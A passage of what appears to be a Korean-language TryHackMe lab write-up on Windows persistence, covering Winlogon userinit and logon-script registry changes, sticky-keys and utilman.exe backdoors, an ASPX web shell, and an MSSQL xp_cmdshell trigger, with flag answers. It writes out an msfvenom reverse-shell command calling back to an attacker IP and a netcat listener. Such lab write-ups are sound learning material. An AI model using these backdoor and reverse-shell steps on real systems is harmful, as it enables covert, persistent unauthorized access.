Winlogon을 악용할 수도 있습니다. Winlogon은 인증 후 프로필을 로드하는 역할을 합니다. 핵심 개념은 위와 유사합니다. 로그인은 우리의 쉘을 비활성화합니다. 이를 달성하기 위해 레지스트리 키를 변경할 것입니다. HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ 내에서 userinit 또는 shell을 변경하여 액세스를 얻을 수 있습니다.

이 방에서는 플래그를 얻기 위해 userinit를 사용해야 합니다. 그러나 두 가지 방법 모두 동일합니다.

다시 한 번 msfvenom을 사용하여 페이로드를 생성할 것입니다:

```js
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.213.167 LPORT=4452 -f exe -o revshell.exe
```

<div class="content-ad"></div>

우리는 Python3를 사용하여 페이로드를 전송할 것입니다:

보시다시피, 처음에 포트를 포함시키는 것을 잊었습니다 — 쉽게 수정할 수 있었어요!

피해자가 인지하기 어렵도록 C:\windows로 페이로드를 이동시킬 거예요. 실제로는 위치를 더 은폐할 것이지만, 이 연습을 위해서는 그 정도만 이해하는 것이 적당합니다.

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_77.png" />

<div class="content-ad"></div>

이제 레지스트리 대상 위치를 조정할 것입니다. 이 경우에는 명령을 대체하는 것이 아니라 userinit에 추가 지시사항을 추가하는 것입니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_78.png)

그런 다음 리스너를 설정하고 (nc -lvp 4452), 로그아웃하고 다시 로그인한 후 쉘을 기다립니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_79.png)

<div class="content-ad"></div>

빙고. 이제 플래그를 획득해야 해요.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_80.png)

정답: THM'I_INSIST_GO_FIRST'

# 플래그 13

<div class="content-ad"></div>

이전에 사용한 페이로드를 그대로 사용하겠습니다. 문제 없어야 하고, 이번에는 더블 체크했어요! 이전 플래그에 대한 변경사항도 초기화했습니다.

사용자 프로필을 로딩하는 동안, userinit이 'UserInitMprLogonScript'를 찾습니다. 이 변수는 기본적으로 설정되지 않았기 때문에 우리는 여기에서 이점을 취할 수 있어요.

이 스크립트는 현재 사용자를 위한 것이므로 현재 사용자 레지스트리를 악용해야 합니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_81.png)

<div class="content-ad"></div>

그럼 간단히 로그아웃하고 다시 로그인하면 이제 끝!

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_82.png)

쉽죠!

답변: THM'USER_TRIGGERED_PERSISTENCE_FTW'

<div class="content-ad"></div>

# 작업 7 — 로그인 화면/RDP에 백도어 넣기

# 플래그 14

이 플래그는 머신/RDP에 액세스할 수 있어야 성공합니다. 이것은 영속성을 확보하기 위한 타당한 방법은 아니지만, 스티키 키를 악용하는 흥미로운 방법입니다!

많은 사람들에게 알려진 스티키 키의 단축키는 빠르게 5번 shift 키를 누르는 것입니다. 대부분은 실수로 만나게 되는 것이죠.

<div class="content-ad"></div>

잘, 5개의 Shift 키 조합은 그저 단축키일 뿐이에요. 만약 이 단축키를 조작할 수 있다면, 더 해로운 목적으로 재지향할 수 있어요.

이건 놀랍게도 간단하게 할 수 있어요. 스티키 키는 sethc.exe를 사용하는데요 — 만약 cmd.exe를 이 파일로 복사하면, 이 단축키를 사용해서 명령 프롬프트를 얻을 수 있어요 — 그리고 이 모든 것을 RDP를 통해 할 수 있어요.

아래는 필요한 단계입니다. 간단히 말하면, 우리는 sethc.exe 파일의 소유권을 가져와서 우리 자신에게 완전한 권한을 부여한 후에 sthc.exe의 내용을 cmd.exe로 바꾸는 것입니다 — 

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_83.png)

<div class="content-ad"></div>

화면을 잠그는 것이 가능합니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_84.png)

그런 다음 간단히 Shift 키를 5번 누르면 명령 프롬프트를 얻을 수 있어요! 재미있게도, 제 컴퓨터는 제가 Shift 키를 5번 누르자마자, 스티키 키를 활성화할지 물었어요. 이미지에 추가한 이유는 그것이 재미있어 보였기 때문입니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_85.png)

<div class="content-ad"></div>

이미지 태그를 Markdown 형식으로 변경하였습니다. 

Ez.

정답: THM'BREAKING_THROUGH_LOGIN'

# Flag 15

<div class="content-ad"></div>

utilman.exe은 다른 악용 가능한 잠금 화면 트릭입니다. 접근 용이 버튼을 악용하여 우리에게... 접근 용이성을 제공할 수 있습니다. 거의 의도된 것처럼 보입니다!

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_87.png)

여기서의 접근 방법은 거의 Sticky Keys와 동일합니다: 권한을 부여하고 파일을 덮어쓰기합니다. 간단합니다.

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_88.png)

<div class="content-ad"></div>

다음으로 화면을 간단히 잠그고, 접근 편의성을 사용하여 cmd.exe를 실행하면 됩니다.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_89.png)

정말 간단한 방법이죠. 보통의 플래그 명령어로 플래그를 얻을 수 있습니다.

답변: THM'THE_LOGIN_IS_MERELY_A_SUGGESTION'

<div class="content-ad"></div>

# 기존 서비스를 통해 지속성 유지

# Flag 16

이 플래그는 웹쉘을 통해 기존 서비스를 공격하는 것입니다. 이 곳에서 발견된 웹쉘을 사용하는 것이 좋습니다. 개인적으로 나는 다운로드할 때 내 컴퓨터가 이를 바이러스로 인식하여 다운로드를 거부했습니다. 그래서 내용을 복사하여 빈 문서에 붙여넣고 shell.aspx로 저장했습니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_90.png)

<div class="content-ad"></div>

http.server를 사용하여 파일을 전송해보세요:

그런 다음 shel.aspx 파일을 webroot 디렉토리로 이동합니다:

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_91.png)

그리고 나서 쉘에 관리자 권한을 부여해줍니다.

<div class="content-ad"></div>

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_92.png" />

이제 웹 주소로 이동해서 쉘에 접속할 수 있습니다:

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_93.png" />

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_94.png" />

<div class="content-ad"></div>

한 번 더, 무서울 정도로 간단하죠 — 하지만 '야생에서 활용될 가능성은 적을 거에요.

답: THM'EZ_WEB_PERSISTENCE'

# Flag 17

MSSQL 공격, 얼마나 즐거운건가요. 이 플래그를 얻기 위해 트리거를 이용할 거에요 — 간단하게 말하면, 이벤트가 발생하면 쉘 역시 발생해요.

<div class="content-ad"></div>

지금은 MSSQL에 대한 지식이 제한적이기 때문에이 작업을 주의 깊게 따라하기에 많이 의존했던 것을 고백하겠습니다. Microsoft SQL Server Management Studio 18을 열고 New Query를 클릭한 후 다음을 추가합니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_95.png)

이를 통해 Advanced Options 및 xp_cmdshell에 액세스 할 수 있게 됩니다.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_96.png)

<div class="content-ad"></div>

이제 xp_cmdshell에 액세스하는 모든 사용자가 쉘을 사용할 수 있도록 보장해야 합니다. sa(system administrator)로 특정 사용자를 표현하도록 허용함으로써 이를 수행할 수 있습니다:

![image 1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_97.png)

그런 다음 다른 데이터베이스를 악용합니다:

![image 2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_98.png)

<div class="content-ad"></div>

그런 다음 실행될 명령에 대한 쿼리를 생성합니다. 여기서 실수를 했는데, 내 기계 대신 IP를 포함하는 것을 깜빡해서 sql_backdoor1이라는 후속 쿼리를 생성했습니다.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_99.png)

이제 이 지점부터는 작업을 완료한 후 스크린샷을 찍을 것입니다. 작업에 대해 100% 확신이 없어서 문서화하고 나 자신을 혼란스럽게 만들기 전에 프로세스를 더 잘 이해하려고 했습니다.

이 단계 이후에는 악의적인 스크립트인 evilscript.ps1을 내 기계에 생성했습니다. 그 exploit은 그런 다음 셸을 내 기계에서 다운로드하여 실행할 것입니다. 트리거는 데이터베이스에 추가함으로써 발생합니다. IP로 이동하면 데이터베이스가 제공됩니다. 정보를 입력하면 exploit이 트리거됩니다:

<div class="content-ad"></div>

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_100.png)

저의 진입 (제대로 수행했을 때)이 입력되지 않았습니다 — 대신 셸이 생성되었습니다. 실제로, 의심을 방지하기 위해 기능성이 유지되도록 하고 싶을 것입니다.

셸을 획득한 후에, 우리는 깃발을 획득하기 위한 정상적인 연습을 합니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_101.png)

<div class="content-ad"></div>

훠자!

답변: THM'I_LIVE_IN_YOUR_DATABASE'

# 결론

와우! 어떤 방이죠 — 이 내용을 이해하고 싶다면 빨리 완료할 수 있는 방이 아닙니다. 내용을 주의 깊게 이해했는지 확인해 보시기를 촉구합니다. 빠른 답변을 원하고 오셨다면 기억해 주세요: THM에서 점수는 내용을 이해하지 않는다면 의미가 없습니다. 이 글은 제 학습 과정을 돕기 위한 것입니다 — 쉬운 해결책을 드리기 위한 것이 아닙니다.

<div class="content-ad"></div>

우리는 엄청난 범위의 취약점을 다루었어요: 서비스, 레지스트리 키, 웹쉘, MSSQL, 비특권 계정 및 다른 접근 방법 등등.

회사나 개인이 자신들의 파일이 변경되지 않도록 보장하기 위해 엄격한 시스템을 갖추는 것이 매우 중요합니다. 또한 변경 사항을 알리기 위한 로그와 경보가 있어야 합니다. 이러한 기본적인 안전장치가 없으면 쉘들이 민감한 시스템을 쉽게 악용할 수 있어요.

이 방이 눈을 떴게 해 줘서 정말 감사해요. 제가 작성한 글 중 가장 긴 글일 수도 있겠어요. 완성하는 데 가장 많은 시간을 소요했네요!